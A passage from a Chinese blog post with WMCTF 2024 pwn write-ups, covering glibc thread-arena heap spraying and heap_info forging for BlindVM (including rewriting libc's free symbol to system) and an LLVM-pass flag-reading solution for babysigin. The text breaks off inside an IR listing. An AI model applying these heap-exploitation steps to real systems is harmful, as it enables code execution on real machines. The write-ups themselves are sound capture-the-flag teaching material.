@@ -1,0 +1,1061 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024 WMCTF-PWN 题解（BlindVM、babysigin、evm、magicpp） · Y0uYuGe</title>
+<meta name="description" content="从 code 中提取第二个字节（第 8 至第 15 位），将其右移 4 位，保留高 4 位，再通过 &amp; 7 操作保留移位结果的最低 3 位。最终 result 的值是 code 第二个字节高 4 位中的最低 3 位。这类操作通常用于提取字节中的特定位字段，可能用于解析编码格式或协议。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20WMCTF-PWN%20%E9%A2%98%E8%A7%A3%EF%BC%88BlindVM%E3%80%81babysigin%E3%80%81evm%E3%80%81magicpp%EF%BC%89" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024">2024 年</a></nav>
+    <h1>2024 WMCTF-PWN 题解（BlindVM、babysigin、evm、magicpp）</h1>
+    <div class="meta"><time>2024-09-23</time><span class="tag">#pwn</span><span class="tag">#Heap</span></div>
+    <article class="post-body">
+<blockquote>
+<p>衷心感谢 tplus 师傅的耐心帮助</p>
+</blockquote>
+<p>本文首发于奇安信攻防社区 <a href="https://forum.butian.net/share/3812">https://forum.butian.net/share/3812</a></p>
+<h1 id="blindvm">BlindVM</h1>
+<p><a href="https://blog.csdn.net/vincent3678/article/details/117458127">Linux 进程虚拟内存空间布局／Linux 下的虚拟内存分布</a></p>
+<pre><code class="language-bash">hint: https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/arena.c;hb=09fb06d3d60291af6cdb20357dbec2fbb32514de#l596
+
+hint2: Useheap spraying to make the heap space contiguous with the LIBC space.
+
+Task content：The expected solution does not require any brute force.
+47.104.193.231:9999
+</code></pre>
+<pre><code class="language-bash">da1bb0f99/bin$ checksec BlindVM
+[*] &#39;/home/llk/Desktop/pwn/2024 WMCTF/BlindVM_3952e413eaca0e8ede93af1da1bb0f99/bin/BlindVM&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<p><a href="https://www.cnblogs.com/mickole/p/3186606.html">Linux 系统编程之进程（四）：进程退出 exit 与 _exit 的区别及 atexit 函数</a></p>
+<p>可以尝试大于 topchunk 的不同大小</p>
+<h2 id="线程栈">线程栈</h2>
+<p>开始时，<code>__pthread_create_2_1</code> 通过 mmap 分配大小为 <code>0x801000</code> 的线程栈，随后切分为 <code>800000</code> 和 <code>1000</code></p>
+<pre><code class="language-c">
+#0  __GI___mmap64 (addr=addr@entry=0x0, len=len@entry=8392704, prot=prot@entry=0, flags=flags@entry=131106, fd=fd@entry=-1, offset=offset@entry=0) at ../sysdeps/unix/sysv/linux/mmap64.c:47
+#1  0x000070fc02095707 in allocate_stack (stacksize=&lt;synthetic pointer&gt;, stack=&lt;synthetic pointer&gt;, pdp=&lt;synthetic pointer&gt;, attr=0x7ffca70c5d30) at ./nptl/allocatestack.c:370
+#2  __pthread_create_2_1 (newthread=0x7ffca70c5e60, attr=0x0, start_routine=0x6223aad872c0, arg=0x0) at ./nptl/pthread_create.c:647
+
+   0x6223ac771000     0x6223ac792000 rw-p    21000      0 [heap]
+    0x70fc01600000     0x70fc01601000 ---p     1000      0 [anon_70fc01600]
+    0x70fc01601000     0x70fc01e01000 rw-p   800000      0 [anon_70fc01601]
+    0x70fc02000000     0x70fc02028000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
+</code></pre>
+<h2 id="线程堆初始化与-mmap-相关分配">线程堆初始化与 mmap 相关分配</h2>
+<p>新线程中 heap_info、mstate 和 topchunk 的初始化流程</p>
+<pre><code class="language-c">__GI___libc_malloc-&gt;tcache_init-&gt;arena_get-&gt;arena_lock-&gt;arena_get2-&gt;_int_new_arena-&gt;new_heap-&gt;alloc_new_heap (size, top_pad, GLRO (dl_pagesize), MAP_NORESERVE);-&gt;MMAP (0, max_size &lt;&lt; 1, PROT_NONE, mmap_flags) max_size &lt;&lt; 1=8000000 和__munmap (p1, ul);和 __munmap (p2 + max_size, max_size - ul);
+
+
+ 0x6223ac771000     0x6223ac792000 rw-p    21000      0 [heap]
+    0x70fbf9600000     0x70fc01600000 ---p  8000000      0 [anon_70fbf9600]
+    
+    0x70fc01600000     0x70fc01601000 ---p     1000      0 [anon_70fc01600]
+    0x70fc01601000     0x70fc01e01000 rw-p   800000      0 [anon_70fc01601]
+
+__munmap (p1, ul);和 __munmap (p2 + max_size, max_size - ul);后
+
+ 0x6223ac771000     0x6223ac792000 rw-p    21000      0 [heap]
+    0x70fbfc000000     0x70fc00000000 ---p  4000000      0 [anon_70fbfc000]
+    0x70fc01600000     0x70fc01601000 ---p     1000      0 [anon_70fc01600]
+    0x70fc01601000     0x70fc01e01000 rw-p   800000      0 [anon_70fc01601]
+</code></pre>
+<p>当申请大小超过线程堆中的 topchunk，但未达到 <code>0x20000 mp_.mmap_threshold</code> 时，会进入以下流程，相当于增加 heap_info 的大小，topchunk 的大小自然也随之增大（size 是申请的字节数，按页大小对齐），然后切分 topchunk</p>
+<pre><code class="language-c">sysmalloc (nb, av);
+{
+……
+   if ((long) (MINSIZE + nb - old_size) &gt; 0
+          &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == 0)
+        {
+          av-&gt;system_mem += old_heap-&gt;size - old_heap_size;
+          set_head (old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top)
+                    | PREV_INUSE );
+        }
+}
+
+grow_heap {
+……
+  diff = ALIGN_UP (diff, pagesize);
+  new_size = (long) h-&gt;size + diff;
+  if ((unsigned long) new_size &gt; (unsigned long) max_size)
+    return -1;
+    ……
+   }
+保证在0x4000000范围内
+  0x6223ac771000     0x6223ac792000 rw-p    21000      0 [heap]
+    0x70fbfc000000     0x70fbfc021000 rw-p    21000      0 [anon_70fbfc000]
+    0x70fbfc021000     0x70fc00000000 ---p  3fdf000      0 [anon_70fbfc021]
+</code></pre>
+<p>但如果大于或等于 <code>0x20000 mp_.mmap_threshold</code>，就直接通过 mmap 分配</p>
+<pre><code class="language-c"> mm = sysmalloc_mmap (nb, pagesize, 0, av);
+ -&gt;
+  MMAP (0, size,
+			    mtag_mmap_flags | PROT_READ | PROT_WRITE,
+			    extra_flags);
+</code></pre>
+<p>而在 grow_heap 中，如果 <code>h-&gt;size + diff;</code> 的大小已经超过 0x4000000 范围，就会进入下面的处理流程</p>
+<pre><code class="language-c">  else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad)))
+   -&gt;
+  alloc_new_heap (size就是nb + (MINSIZE + sizeof (*heap)), top_pad, GLRO (dl_pagesize), MAP_NORESERVE);
+  -&gt;
+  MMAP (0, max_size &lt;&lt; 1, PROT_NONE, mmap_flags);
+  else
+    aligned_heap_area = p2 + max_size;
+     __munmap (p2 + max_size, max_size - ul);
+
+newheap后的处理流程（av还是之前那个，但把av的top改成了当前新heap的topchunk），大小就是heap-&gt;size - sizeof (*heap)) | PREV_INUSE，然后会设置一些间隔堆
+
+ {
+          /* Use a newly allocated heap.  */
+          heap-&gt;ar_ptr = av;
+          heap-&gt;prev = old_heap;
+          av-&gt;system_mem += heap-&gt;size;
+          /* Set up the new top.  */
+          top (av) = chunk_at_offset (heap, sizeof (*heap));
+          set_head (top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE);
+
+          /* Setup fencepost and free the old top chunk with a multiple of
+             MALLOC_ALIGNMENT in size. */
+          /* The fencepost takes at least MINSIZE bytes, because it might
+             become the top chunk again later.  Note that a footer is set
+             up, too, although the chunk is marked in use. */
+          old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;
+          set_head (chunk_at_offset (old_top, old_size + CHUNK_HDR_SZ),
+		    0 | PREV_INUSE);
+          if (old_size &gt;= MINSIZE)
+            {
+              set_head (chunk_at_offset (old_top, old_size),
+			CHUNK_HDR_SZ | PREV_INUSE);
+              set_foot (chunk_at_offset (old_top, old_size), CHUNK_HDR_SZ);
+              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);
+              _int_free (av, old_top, 1);
+              
+00:0000│  0x72b087ffffe0 ◂— 0xf60  是原来的topchunk的size
+01:0008│  0x72b087ffffe8 ◂— 0x10 
+02:0010│  0x72b087fffff0 ◂— 0x10
+03:0018│  0x72b087fffff8 ◂— 1
+
+            }
+          else
+            {
+              set_head (old_top, (old_size + CHUNK_HDR_SZ) | PREV_INUSE);
+              set_foot (old_top, (old_size + CHUNK_HDR_SZ));
+            }
+        }
+然后再新的topchunk分割
+ p = av-&gt;top;
+  size = chunksize (p);
+
+  /* check that one of the above allocation paths succeeded */
+  if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
+    {
+      remainder_size = size - nb;
+      remainder = chunk_at_offset (p, nb);
+      av-&gt;top = remainder;
+      set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+      set_head (remainder, remainder_size | PREV_INUSE);
+      check_malloced_chunk (av, p, nb);
+      return chunk2mem (p);
+    }
+</code></pre>
+<p>注意，新堆中没有 mstate，只有 heap_info，其余部分是 topchunk</p>
+<h2 id="思路">思路</h2>
+<p>mmap 分配的区域位于主线程堆与栈之间的某个偏移处，中间存在 mmap 分配的匿名映射，以及 libc、ld 的文件映射。</p>
+<ul>
+<li>先分配当前 heap_info 中的空间（留下残余 topchunk，但让其大小既无法满足申请，也无法扩展，从而申请新的 heap_info），再使申请大小加上当前 heap-&gt;size 大于 max_size，使原有 topchunk 被释放，随后获得新的 heap_info</li>
+<li>申请大于 <code>0x20000 </code> 的空间，让 mmap 分配填满堆与 libc 之间的部分</li>
+<li>从此前进入 unsortedbin 的 chunk 中分配一部分，再通过溢出修改其 size，使切分时 unsortedbin 的 fd 恰好落到新页的前八字节（即 libc 对应 heap_info 的 ar_ptr，因为每次获取 chunk 时都会检查其 arena 是否与 ar_ptr 匹配，而此时 fd 指向 ar_ptr 对应的 mstate 内部），随后将其分配出来，通过部分写获得 <code>ar_ptr </code></li>
+</ul>
+<pre><code class="language-c"> assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
+          ar_ptr == arena_for_chunk (mem2chunk (victim)));
+</code></pre>
+<ul>
+<li>然后分配当前新 heap_info 中的空间（留下残余 topchunk，但让其大小既无法满足申请，也无法扩展，从而申请新的 heap_info），再修改 topchunk 的 size，将其增大</li>
+<li>随后不断分配，直到该 heap_info 只剩 0x10（但由于 size 已被修改，对应的 topchunk 仍然很大），再申请 size=<code>0x4000010  </code>，使第一次分配落到第二个 heap_info，第二次分配落到第一个 heap_info</li>
+<li></li>
+</ul>
+<pre><code class="language-c">0x76becc000000   0x76bed0000000     rw-p  4000000     0 [anon_76becc00]  第二个
+ 0x76bed0000000     0x76bed4000000 rw-p  4000000      0 [anon_76bed0000]
+    0x76bed4000000     0x76bed8000000 rw-p  4000000      0 [anon_76bed4000]  第一个
+
+第一个下面总是不连续，并且小于0x20000，可以每次喷的时候多个小于0x20000的部分，来把不足0x20000的部分填满
+</code></pre>
+<ul>
+<li>此时 topchunk 位于 heap_info 下方，此前伪造的 heap_info 恰好位于 heap_info 下方的起始处。也就是说，第一次分配完成后，topchunk 移动到伪造的 heap_info。这样便将 _heap_info 视作 topchunk，再次分配时恰好通过 ar_ptr 检查，同时也能写入 size 后面的数据，从而控制 heap_info
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20WMCTF-PWN%20%E9%A2%98%E8%A7%A3%EF%BC%88BlindVM%E3%80%81babysigin%E3%80%81evm%E3%80%81magicpp%EF%BC%89/assets/csdn-141989628/image-001-a9d2c0bf0f.png" alt="图片"></li>
+</ul>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20WMCTF-PWN%20%E9%A2%98%E8%A7%A3%EF%BC%88BlindVM%E3%80%81babysigin%E3%80%81evm%E3%80%81magicpp%EF%BC%89/assets/csdn-141989628/image-002-4f8fe175c1.png" alt="图片"></p>
+<ul>
+<li>后续通过 grow_heap 扩展 topchunk，再切分以覆盖 libc，就顺理成章了</li>
+</ul>
+<blockquote>
+<p>加载 libc 地址的过程大致如下
+dl_fixup 通过字符串找到该函数对应的结构
+这个结构保存了一个偏移
+该函数最终的真实地址为 l_addr（库加载地址）+ 偏移
+这个结构存放在 libc 开头的 ro 段
+我们拥有的原语（mprotect）可以将其改为 rw，随后直接将 free 对应的偏移改写为 system</p>
+</blockquote>
+<pre><code class="language-bash">IDA中的Elf64_Sym
+LOAD:000000000000D4D0                 dd offset aLibcFree+7 - offset unk_16650; st_name ; &quot;free&quot;
+LOAD:000000000000D4D4                 db 12h                  ; st_info
+LOAD:000000000000D4D5                 db 0                    ; st_other
+LOAD:000000000000D4D6                 dw 0Fh                  ; st_shndx
+LOAD:000000000000D4D8                 dq offset free          ; st_value
+LOAD:000000000000D4E0                 dq 101h                 ; st_size
+
+
+
+pwndbg&gt; p &amp;free
+$80 = (void (*)(void *)) 0x72b088ca53e0 &lt;__GI___libc_free&gt;
+pwndbg&gt; libc
+libc : 0x72b088c00000
+pwndbg&gt; p/x 0x72b088ca53e0-0x72b088c00000
+$81 = 0xa53e0
+pwndbg&gt; search -p 0xa53e0
+Searching for value: b&#39;\xe0S\n\x00\x00\x00\x00\x00&#39;
+libc.so.6       0x72b088c0d4d8 0xa53e0
+libc.so.6       0x72b088c0d640 0xa53e0
+libc.so.6       0x72b088c14618 0xa53e0
+pwndbg&gt; vmmap 0x72b088c0d4d8
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size Offset File
+    0x72b088a01000     0x72b088c00000 rw-p   1ff000      0 [anon_72b088a01]
+►   0x72b088c00000     0x72b088c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6 +0xd4d8
+    0x72b088c28000     0x72b088dbd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
+pwndbg&gt; p/x 0x72b088c0d4d8-0x72b088c00000
+$82 = 0xd4d8
+pwndbg&gt; tele 0x72b088c0d4d0
+00:0000│  0x72b088c0d4d0 ◂— 0xf001200004dde
+01:0008│  0x72b088c0d4d8 ◂— 0xa53e0
+02:0010│  0x72b088c0d4e0 ◂— 0x101
+03:0018│  0x72b088c0d4e8 ◂— 0xf001200001e92
+04:0020│  0x72b088c0d4f0 ◂— 0x3a1b0
+05:0028│  0x72b088c0d4f8 ◂— 0x13
+06:0030│  0x72b088c0d500 ◂— 0xfff1001100007e62 /* &#39;b~&#39; */
+07:0038│  0x72b088c0d508 ◂— 0
+</code></pre>
+<h2 id="利用脚本">利用脚本</h2>
+<p>不知道为什么发不出来</p>
+<h1 id="babysigin">babysigin</h1>
+<p>LLVM pass 题目
+粗看给了 mmap、open、read、write，直接读 flag 不就行了？不过有一些限制，还有一些特殊之处需要逆向</p>
+<pre><code class="language-c">apt-get -y install llvm &amp;&amp; apt-get -y install clang 
+
+clang-14 -emit-llvm llk.c -S -o  llk.bc
+</code></pre>
+<p>需要使用 <code>opt -load ./WMCTF.so -WMCTF -enable-new-pm=0 ./llk.bc</code> 启动。我忘了检查，一直漏掉 <code> -enable-new-pm=0</code>，导致始终找不到 PASS</p>
+<h2 id="模块函数与基本块">模块、函数与基本块</h2>
+<p>下面用一个 C 语言示例说明 Module、Function 和 Basic Block 的关系。这些概念是 LLVM IR 的核心组成部分。</p>
+<p>先来看一个简单的 C 程序：</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int add(int a, int b) {
+    return a + b;
+}
+
+int max(int a, int b) {
+    if (a &gt; b) {
+        return a;
+    } else {
+        return b;
+    }
+}
+
+int main() {
+    int x = 5, y = 10;
+    int sum = add(x, y);
+    int maximum = max(x, y);
+    printf(&quot;Sum: %d, Max: %d\n&quot;, sum, maximum);
+    return 0;
+}
+</code></pre>
+<p>下面说明这个程序在 LLVM 中如何组织：</p>
+<ol>
+<li><p>Module（模块）：</p>
+<ul>
+<li>整个 C 文件被视为一个 Module。</li>
+<li>Module 是 LLVM IR 的顶层容器。</li>
+<li>它包含所有函数定义、全局变量和其他顶层实体。</li>
+</ul>
+</li>
+<li><p>Function（函数）：</p>
+<ul>
+<li>本例中有三个函数：<code>add</code>、<code>max</code> 和 <code>main</code>。</li>
+<li>每个函数在 LLVM IR 中表示为一个 Function。</li>
+<li>Function 包含函数参数、返回类型和函数体。</li>
+</ul>
+</li>
+<li><p>Basic Block（基本块）：</p>
+<ul>
+<li>每个函数由一个或多个 Basic Block 组成。</li>
+<li>Basic Block 是一系列连续指令，只有一个入口（第一条指令）和一个出口（最后一条指令）。</li>
+<li>在本例中：<ul>
+<li><code>add</code> 函数可能只有一个基本块。</li>
+<li><code>max</code> 函数可能有三个基本块：分别用于条件检查、<code>if</code> 分支和 <code>else</code> 分支。</li>
+<li><code>main</code> 函数可能有一个或多个基本块，具体取决于编译器优化。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>再仔细看看 <code>max</code> 函数，因为它展示了多个基本块：</p>
+<pre><code class="language-llvm">define i32 @max(i32 %a, i32 %b) {
+entry:
+  %cmp = icmp sgt i32 %a, %b
+  br i1 %cmp, label %if.then, label %if.else
+
+if.then:                                          ; preds = %entry
+  ret i32 %a
+
+if.else:                                          ; preds = %entry
+  ret i32 %b
+}
+</code></pre>
+<p>在这段 LLVM IR 表示中：</p>
+<ul>
+<li>整个 <code>max</code> 函数是一个 Function。</li>
+<li>它包含三个基本块：<code>entry</code>、<code>if.then</code> 和 <code>if.else</code>。</li>
+<li><code>entry</code> 块包含比较指令和条件分支。</li>
+<li><code>if.then</code> 和 <code>if.else</code> 块各包含一条返回指令。</li>
+</ul>
+<p>关系总结：</p>
+<ol>
+<li>一个 Module 包含多个 Function。</li>
+<li>每个 Function 包含一个或多个 Basic Block。</li>
+<li>Basic Block 包含实际的指令序列。</li>
+</ol>
+<h2 id="逆向分析">逆向分析</h2>
+<p>结合动态调试与 AI 进行逆向（让 AI 根据 PASS 生成一个 C 语言示例）</p>
+<h2 id="要点-1">要点 1</h2>
+<pre><code class="language-c"> var = (llvm::Value *)llvm::UnaryInstruction::getOperand(load_code, 0);
+          var_name = llvm::Value::getName(var);
+
+llvm::StringRef::StringRef((llvm::StringRef *)&amp;v68, &quot;.addr&quot;);
+          if ( (llvm::StringRef::contains(&amp;var_name, v68.data_ptr, v68.len) &amp; 1) == 0 )
+          {
+</code></pre>
+<p>getOperand 取出第一个参数变量，再由 getName 获取变量名，变量名需要包含 <code>.addr</code></p>
+<h2 id="要点-2">要点 2</h2>
+<p>然后获取当前 call 指令所在的函数，开始遍历该函数所属模块中每个函数的每个 basic_block 内的指令</p>
+<pre><code class="language-c"> moudle = (llvm::Module *)llvm::GlobalValue::getParent(fucntion_1);
+          `anonymous namespace&#39;::WMCTF::getFunctionCallValue[abi:cxx11](
+            (llvm *)file_name_1,
+            (__int64)this,
+            moudle,
+            fucntion_1,
+            0);
+</code></pre>
+<p>如果存在 call 指令，且被调用函数与之前 call 指令所在的函数相同，则进入以下流程</p>
+<pre><code class="language-c"> call = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(instruction);
+          if ( call )
+          {
+            CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(call);
+            called_fuc_name = llvm::Value::getName(CalledFunction);
+            v41 = v7;
+            func_name = llvm::Value::getName(func_1);
+            v39 = v8;
+            if ( (llvm::operator==(called_fuc_name, v41, func_name, v8) &amp; 1) != 0 )
+            {
+</code></pre>
+<p>接着检查被调用函数的参数是否为 loadinst，即指针；如果参数变量名包含 <code>.addr</code>，则再次进入上述流程</p>
+<pre><code class="language-c"> if ( (llvm::operator==(called_fuc_name, v41, func_name, v8) &amp; 1) != 0 )
+            {
+              Operand = llvm::CallBase::getOperand(call, 0);
+              loadinst = (llvm::UnaryInstruction *)llvm::dyn_cast&lt;llvm::LoadInst,llvm::Value&gt;(Operand);
+              if ( loadinst )
+              {
+                addr = (llvm::Value *)llvm::UnaryInstruction::getOperand(loadinst, 0);
+                Name = llvm::Value::getName(addr);
+                v36 = v11;
+                llvm::StringRef::StringRef((llvm::StringRef *)v34, &quot;.addr&quot;);
+                if ( (llvm::StringRef::contains(&amp;Name, v34[0], v34[1]) &amp; 1) != 0 )
+                {
+                  `anonymous namespace&#39;::WMCTF::getFunctionCallValue[abi:cxx11](
+                    result,
+                    a2,
+                    moudle_1,
+                    func,
+                    recursion_dep_1 + 1);
+                  return result;
+                }
+</code></pre>
+<p>如果不包含 <code>.addr</code>，则进入下面的处理流程：如果查找当前被调用函数的递归深度不是 3，就返回空字符串</p>
+<pre><code class="language-c"> if ( recursion_dep_1 != 3 )
+                {
+                  v12 = llvm::errs((llvm *)&amp;Name);
+                  v13 = llvm::raw_ostream::operator&lt;&lt;(v12, recursion_dep_1);
+                  llvm::raw_ostream::operator&lt;&lt;(v13, &quot;\n&quot;);
+                  std::allocator&lt;char&gt;::allocator(v33);
+                  std::string::basic_string(result, &quot;&quot;, v33);
+                  std::allocator&lt;char&gt;::~allocator(v33);
+                  return result;
+                }
+</code></pre>
+<p>如果不包含 <code>.addr</code> 且递归深度为 3，则进入下面的流程。这里查找所有使用当前函数的 loadins 参数的指令，再选出 StoreInst 指令，通过它获取参数，最后将其设为字符串。但这里必须满足 <code>v16 = llvm::StoreInst::getOperand(v26, 0);                     v25 = (llvm::ConstantExpr *)llvm::dyn_cast&lt;llvm::ConstantExpr,llvm::Value&gt;(v16);</code></p>
+<pre><code class="language-c">v32 = (llvm::Value *)llvm::UnaryInstruction::getOperand(loadinst, 0);
+                v30[0] = llvm::Value::uses(v32);
+                v30[1] = v14;
+                v31 = v30;
+                v29 = llvm::iterator_range&lt;llvm::Value::use_iterator_impl&lt;llvm::Use&gt;&gt;::begin(v30);
+                v28 = llvm::iterator_range&lt;llvm::Value::use_iterator_impl&lt;llvm::Use&gt;&gt;::end(v31);
+                while ( (llvm::Value::use_iterator_impl&lt;llvm::Use&gt;::operator!=(&amp;v29, &amp;v28) &amp; 1) != 0 )
+                {
+                  v27 = (llvm::Use *)llvm::Value::use_iterator_impl&lt;llvm::Use&gt;::operator*(&amp;v29);
+                  User = llvm::Use::getUser(v27);
+                  v26 = (llvm::StoreInst *)llvm::dyn_cast&lt;llvm::StoreInst,llvm::User&gt;(User);
+                  if ( v26 )
+                  {
+                    v16 = llvm::StoreInst::getOperand(v26, 0);
+                    v25 = (llvm::ConstantExpr *)llvm::dyn_cast&lt;llvm::ConstantExpr,llvm::Value&gt;(v16);
+                    if ( v25 )
+                    {
+                      v17 = llvm::ConstantExpr::getOperand(v25, 0);
+                      v24 = (llvm::GlobalVariable *)llvm::dyn_cast&lt;llvm::GlobalVariable,llvm::Constant&gt;(v17);
+                      if ( v24 )
+                      {
+                        Initializer = llvm::GlobalVariable::getInitializer(v24);
+                        v23 = (llvm::ConstantDataSequential *)llvm::dyn_cast&lt;llvm::ConstantDataArray,llvm::Constant&gt;(Initializer);
+                        if ( v23 )
+                        {
+                          v22[0] = llvm::ConstantDataSequential::getAsString(v23);
+                          v22[1] = v19;
+                          llvm::StringRef::str[abi:cxx11](result, v22);
+                          return result;
+                        }
+                      }
+                    }
+                  }
+                  llvm::Value::use_iterator_impl&lt;llvm::Use&gt;::operator++(&amp;v29);
+                }
+</code></pre>
+<p>先遍历 loadinst 第一个参数的所有使用处，再转换为 storeinst，并取出 storeinst 的第一个参数，该参数需要是全局常量。后来想了想，常量应该都是全局的……
+如下所示</p>
+<pre><code class="language-c"> const char *store=&quot;./flag&quot;;
+ func4(store);
+ 此时对应的IR，此时会自动生成一个全局变量表示&quot;./flag&quot;
+ @.str = private unnamed_addr constant [7 x i8] c&quot;./flag\00&quot;, align 1
+ 
+  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %3, align 8
+  %4 = load i8*, i8** %3, align 8
+  call void @func4(i8* noundef %4)
+</code></pre>
+<h1 id="关键点">关键点</h1>
+<p>声明全局变量时的写法与实际 IR 的对比</p>
+<pre><code class="language-c">const char * flag=&quot;./flag&quot;;
+const char *recrusive = &quot;nouse&quot;;  
+
+@.str = private unnamed_addr constant [7 x i8] c&quot;./flag\00&quot;, align 1
+@flag = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8
+@.str.1 = private unnamed_addr constant [6 x i8] c&quot;nouse\00&quot;, align 1
+@recrusive = dso_local global i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), align 8
+</code></pre>
+<p>直接赋值字符串时的写法与对应 IR 的对比，store 通过 @.str 进行</p>
+<pre><code class="language-c"> const char *store=&quot;./flag&quot;;
+   func4(store);
+   
+  %2 = alloca i8*, align 8
+  %3 = alloca i8*, align 8
+  store i8* %0, i8** %2, align 8
+  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %3, align 8
+  %4 = load i8*, i8** %3, align 8
+  call void @func4(i8* noundef %4)
+</code></pre>
+<p>最后的 write 部分</p>
+<pre><code class="language-c">  addr_string = llvm::UnaryInstruction::getOperand(loadinst, 0);
+                v44 = (llvm::GlobalVariable *)llvm::dyn_cast&lt;llvm::GlobalVariable,llvm::Value&gt;(addr_string);
+                if ( !v44 )
+                {
+                  v88 = 0;
+                  return v88 &amp; 1;
+                }
+                v34 = llvm::GlobalVariable::getOperand(v44, 0);
+                v43 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v34);
+                if ( v43 )
+                {
+                  if ( (unsigned int)llvm::ConstantInt::getSExtValue(v43) != 0x8888 )
+</code></pre>
+<p>这段代码获取全局变量的初始值，并将其转换为 <code>llvm::ConstantInt</code> 类型。
+<code>v44</code> 是 <code>llvm::GlobalVariable</code> 类型的指针，表示一个全局变量。<code>llvm::GlobalVariable::getOperand</code> 方法用于获取该全局变量的第一个操作数，也就是全局变量的初始值。<code>v34</code> 即为该操作数。
+随后，<code>llvm::dyn_cast</code> 方法将 <code>v34</code> 转换为 <code>llvm::ConstantInt</code> 类型，以便访问其值。<code>v43</code> 是指向这个常量整数的指针。
+例如，假设有以下 C 代码：</p>
+<pre><code class="language-c">int global_var = 0x12345678;
+</code></pre>
+<p>对应的 LLVM IR 代码可能如下：</p>
+<pre><code class="language-less">@global_var = external global i32
+</code></pre>
+<p>这里，<code>@global_var</code> 是一个初始值由外部提供的全局变量。如果要获取该全局变量的初始值，可以使用以下代码：</p>
+<pre><code class="language-c++">llvm::GlobalVariable *globalVar = M.getNamedGlobal(&quot;global_var&quot;); // M是一个Module对象
+llvm::Value *initVal = globalVar-&gt;getOperand(0); // 获取全局变量的初始值
+llvm::ConstantInt *constInt = dyn_cast&lt;llvm::ConstantInt&gt;(initVal); // 强制转换为常量整数
+int value = constInt-&gt;getZExtValue(); // 获取常量整数的值
+</code></pre>
+<p>这样，<code>value</code> 就会是 <code>0x12345678</code>。</p>
+<p>ConstantInt 并不等同于 C 语言中的 const</p>
+<h2 id="利用脚本-1">利用脚本</h2>
+<pre><code class="language-c">void  WMCTF_OPEN(const char* str )
+{
+
+}
+void WMCTF_READ(int arg)
+{
+
+}
+
+void WMCTF_MMAP(int arg)
+{
+
+}
+void WMCTF_WRITE(int arg)
+{
+
+}
+const char * flag=&quot;./flag&quot;;
+const char *recrusive = &quot;nouse&quot;;  
+int GLOBAL_CONSTANT = 0x8888;
+void func1(const char * arg)
+{
+    WMCTF_MMAP(0x7890);
+    WMCTF_OPEN(recrusive); 
+
+    WMCTF_READ(0x6666);
+   
+
+    WMCTF_WRITE(GLOBAL_CONSTANT);
+}
+void func2(const char * arg)
+{
+    func1(recrusive);
+}
+void func3(const char * arg)
+{
+    func2(recrusive);
+}
+void func4(const char * arg)
+{
+    func3(recrusive);
+}
+void func5(const char * arg)
+{
+    const char *store=&quot;./flag&quot;;
+    func4(store);
+}
+</code></pre>
+<pre><code class="language-bash">; ModuleID = &#39;llk.c&#39;
+source_filename = &quot;llk.c&quot;
+target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;
+target triple = &quot;x86_64-pc-linux-gnu&quot;
+
+@.str = private unnamed_addr constant [7 x i8] c&quot;./flag\00&quot;, align 1
+@flag = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8
+@.str.1 = private unnamed_addr constant [6 x i8] c&quot;nouse\00&quot;, align 1
+@.addr = dso_local global i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), align 8
+@GLOBAL_CONSTANT = dso_local global i32 34952, align 4
+
+; Function Attrs: noinline nounwind optnone uwtable
+define dso_local void @WMCTF_OPEN(i8* noundef %0) #0 {
+  %2 = alloca i8*, align 8
+  store i8* %0, i8** %2, align 8
+  ret void
+}
+
+; Function Attrs: noinline nounwind optnone uwtable
